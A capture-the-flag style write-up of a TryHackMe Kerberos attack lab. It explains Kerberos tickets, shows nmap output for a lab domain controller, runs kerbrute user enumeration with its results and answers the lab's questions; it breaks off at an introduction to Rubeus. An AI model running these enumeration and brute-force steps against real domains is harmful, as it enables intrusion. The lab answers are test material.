# TryHackMe's Attacking Kerberos Lab Write-up
>Written by Herman Detwiler | 8/2/2021

*Learning how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller*

### Table of Contents
- [Introduction](#Introduction)
- [RECON](#RECON)
- [Enumeration with Kerbrute](#Enumeration-with-Kerbrute)
- [Harvesting and Brute-Forcing Tickets with Rubeus](#Harvesting-and-Brute-Forcing-Tickets-with-Rubeus)
- [Kerberoasting with Rubeus and Impacket](#Kerberoasting-with-Rubeus-and-Impacket)
- [AS-REP Roasting with Rubeus](#AS-REP-ROASTING-with-Rubeus)
- [Pass the Ticket with mimikatz](#Pass-the-Ticket-with-mimikatz)
- [Golden and Silver Ticket attacks with mimikatz](#Golden-and-Silver-Ticket-Attacks-with-Mimikatz)
- [Kereros Backdoors with Mimikatz](#Kerberos-Backdoors-with-Mimikatz)
- [Conclusion](#Conclusion)

Introduction
======================================================================================================
This lab will cover the basics of attacking Kerberos, the windows ticket-granting service.

This Lab Covers

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and impacket
- Golden and Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

This room is related to real-world applications and is a starting point for learning how to escalate privileges to that of a domain admin by attacking Kerberos and taking control of a network.

It is recommended to have a general knowledge of post-exploitation, active directory, and the windows command line.

## What is Kerberos

Kerberos is the deault authentication service for Microsoft Windows domains. It is meant to be more secure than NTLM by using third part ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

### Common Terminology

- **TGT** *Ticket Granting Ticket* : A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.

- **KDC** *Key Distribution Center* : The key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.

- **AS** *Authentication Service* : The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.

- **TGS** *Ticket Granting Service* : The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.

- **SPN** *Service Principal Name* : A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SON set.

- **KDC LT Key** *Key Distribution Center Long Term Key* : The KDC key is based on the KRBTGT service account.  It is used to encrypt the TGT and sign the PAC

- **Client LT Key** *Client Long Term Key* : The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.

- **Service LT Key** *Service Long Term Secret Key* : The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.

- **Session Key** issued by the KDC when a TGT is issued.The user will provide the session key to the KDC along with the TGT when requesting a service ticket

- **PAC** *Privilege Attribute Certificate* The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

### **AS-REQ** with Pre-Authentication in Detail

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps.

1. user encrypts a timestamp NT hash and sends it to the AS
2. The KDC attempts to decrypt the timestamp using the NT hash from the user, 
3. If successful the KDC will issue a TGT and a session key for the user.

### Ticket Granting Ticket Contents

In order to understand how the service tickets get created and validated, we need to start with where the tickets comes from: the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

Example TGT
---

***Encrypted using KDC LT Key***
- Stat/End/Max Renew: 10/31/2021: 1:36; 10/31/2021: 11:36.....
- Service Name: krbtgt: example.local
- Target Name: krbtgt: example.local
- Client Name: user; example.local
- Flages: ooeoooooo
- Session key: ooooxooooooo 12ev21212....

Privilege Attribute Certificate
- Username: example
- SID: S-o-5-45.......

[x] Signed with Service LT key

[x] Signed with KDC LT key

---

<img src="https://upload.wikimedia.org/wikipedia/commons/2/26/TGTplay.gif" />

### Service Ticket Contents
Contains two parts

1. **Service Portion**
: User Details, Session Key, Encrypts the ticket with the service account NTLM hash

2. **User Portion**
: Validity Timestamp, Session Key, Encrypts with the TGT session key.

### Kerberos Authentication Overview
- AS-REQ*uest*-1. The client requests an Authentication Ticket or Ticket Granting Ticket *TGT*
- AS-REP*ly*   2. The Key Distribution Center verifies the client and sends back an encrypted TGT
- TGT-REQ*uest*3. The client send the encrypted TGT to the ticket Granting Server with the SPN or the service the client wants to access
- TGS-REP*ly*  4. The Key Distribution Center KDC verifies the TGT of the user and that the user has access to the servicem then sends a valid session key for the service to the client
- AP-REQ*uest* 5. The client requests the service and sends the valid session key to prove the user has access
- Ap-REP*ly*   6. The service grants access.

### Kerberos Tickest Overview

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

### Attack Privilege Requirements

- **Kerbrute Enumeration** - No domain access required 
- **Pass the Ticket** - Access as a user to the domain required
- **Kerberoasting** - Access as any user required
- **AS-REP Roasting** - Access as any user required
- **Golden Ticket** - Full domain compromise (domain admin) required 
- **Silver Ticket** - Service hash required 
- **Skeleton Key** - Full domain compromise (domain admin) required



RECON
======================================================================================================

### Nmap Results
**Open Ports**

```nmap
Discovered open port 22/tcp on 10.10.53.187
Discovered open port 445/tcp on 10.10.53.187
Discovered open port 3389/tcp on 10.10.53.187
Discovered open port 135/tcp on 10.10.53.187
Discovered open port 53/tcp on 10.10.53.187
Discovered open port 139/tcp on 10.10.53.187
Discovered open port 88/tcp on 10.10.53.187
Discovered open port 593/tcp on 10.10.53.187
Discovered open port 3269/tcp on 10.10.53.187
Discovered open port 3268/tcp on 10.10.53.187
Discovered open port 464/tcp on 10.10.53.187
Discovered open port 389/tcp on 10.10.53.187
Discovered open port 636/tcp on 10.10.53.187
```

**Discovered Services**

```python
PORT     STATE SERVICE       REASON  VERSION
22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBYAa9AZBsEOwCK/28ymk+6ZkIdxdK3dfRnFaUZHlSqUgdz5Fjn/wyUeuAChlOvF6yjcGtcqvx62/Cw8ngaubb9B7QYt8XWGy4aFRL/IYX0O7MiEJQ6YIPGYKQSOs2m/F07FrQPLnzytQ3oh0Gkl6zpOEGtcPYa8BtFj6vpdVthaDipnm4TetegdwUAeRpq1m9chBWONPfU0syMn2TuA8jw+sFIkOCE+x+ylOjHeJ63ncdvrvPeUSkwD//qeOg6JdwaDk3jdtuKxphxkczsc2VvU/OeJ8wW7MMQy2nO1JZTCtrWlms8d2+j1V8pR+fhLIuKu+JpwbLqgr5jieB1CIl
|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCGER+LQSfN21aCiK2J5UoJ7elNly98IB2TIQejTa/vdve8vfzhOcZNkdmCRcwcfqvmMM7eScuhnyuV2l34lDoE=
|   256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBkJkzX/eHfebkreDRkbu0WtQB1EnQtRuYvx3rooVnqm
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-08-04 15:23:20Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CONTROLLER
|   NetBIOS_Domain_Name: CONTROLLER
|   NetBIOS_Computer_Name: CONTROLLER-1
|   DNS_Domain_Name: CONTROLLER.local
|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-04T15:23:25+00:00
| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
| Issuer: commonName=CONTROLLER-1.CONTROLLER.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-08-03T14:13:31
| Not valid after:  2022-02-02T14:13:31
| MD5:   1499 5129 24fd 6dfb be1f 25ee 7b35 65c6
| SHA-1: ae7c 317e 71af 89ff aa43 8034 359e 0f86 5e6d d48f
| -----BEGIN CERTIFICATE-----
| MIIC/jCCAeagAwIBAgIQcPG6j9NR2YhKWwJpr8KG9jANBgkqhkiG9w0BAQsFADAo
| MSYwJAYDVQQDEx1DT05UUk9MTEVSLTEuQ09OVFJPTExFUi5sb2NhbDAeFw0yMTA4
| MDMxNDEzMzFaFw0yMjAyMDIxNDEzMzFaMCgxJjAkBgNVBAMTHUNPTlRST0xMRVIt
| MS5DT05UUk9MTEVSLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEApFFetGqSDkwTeVJBnSTxkQL14FkgXghpTsBwW5ehPS00BoxDeUs5To6enRbO
| eeDtZqpT6YVYaOaZrNO7MVVO0DmnFU+0CNwv7U3wRDnZ3IBT0xI/NUWmenTgWVAa
| 8eRI/Bo4s8sdnIZeMJhkoEeNP1lHvW8PJ+U1sJlkQ+rIsqzl0hY4i3bPrT+TbXNr
| DTrcozggyelQA6QuVRBMAZv0tx9CO5Qy4/fHIMxeWnQ/HMnGJGFHLUNsvQo//fz4
| 93FiW4pEN3g7cCOotbBoJ2SittHBnz2UzPCVya2LLgwZSMC20Xf1RRPvlUDlX4Y5
| OVLJiebrh1bLivonZN+Yj68lvQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAABP909fAz29d4/waYXv
| NUpEFr059pKNhP8H5G8S9HHx7AWulaK1v9oD9YTwj7WXvWnbnV4jXdJ/t5Buc20N
| wxypAICiiWo+TNoVrdI3T4VAbv4oE0HOkV8A0hKbO8WB3o/GJdtfGajxbKgSdng+
| vczPpXsAzkET43w47mIedbOWncEHO+ZQXI9lSiawkJ6Q5w7bBfm42c2Fpc7Qnehr
| a0GXOZy37nKQ/Z8sX3sqbcfhzcFubvBEVv5TPtTLacg6MTYNnmQypBT1Zd7HrdK5
| IpEkrWoobWwABVEIFaTnoAufJ+UEwIEgr2Hs2f/Ef4q/H32Lb0kjEfGl1pB4On4N
| 6ag=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-08-04T15:23:34+00:00; +1s from scanner time.
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63676/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35663/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 15536/udp): CLEAN (Timeout)
|   Check 4 (port 49690/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-04T15:23:26
|_  start_date: N/A

```
Enumeration with Kerbrute
=============================================================================================================================================

### Overview

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.


For this lab you need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.53.187  CONTROLLER.local

### Git addr

`https://github.com/ropnop/kerbrute/releases`

### Usage

```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local usernames.txt
```

`./kerbrute` Execute kerbrute 

`userenum` In user enumeration mode

`--dc CONTROLLER.local` To domain controller named "CONTROLLER.local" 

`-d CONTROLLER.local` To the domain with the same name (in this case)

`usernames.txt` and use our supplied list of possible usernames.

### Kerbrute Results

```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/04/21 - Ronnie Flathers @ropnop

2021/08/04 11:53:54 >  Using KDC(s):
2021/08/04 11:53:54 >   CONTROLLER.local:88

2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2021/08/04 11:53:54 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2021/08/04 11:53:55 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2021/08/04 11:53:55 >  Done! Tested 100 usernames (10 valid) in 0.852 seconds
```
### Questions


1. How many total users do we enumerate?
: 10

2. What is the SQL service account name?
: sqlservice

3. What is the second "machine" account name?
: machine2

4. What is the third "user" account name?
: user3

Harvesting and Brute-Forcing Tickets with Rubeus
=============================================================================================================================================

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus
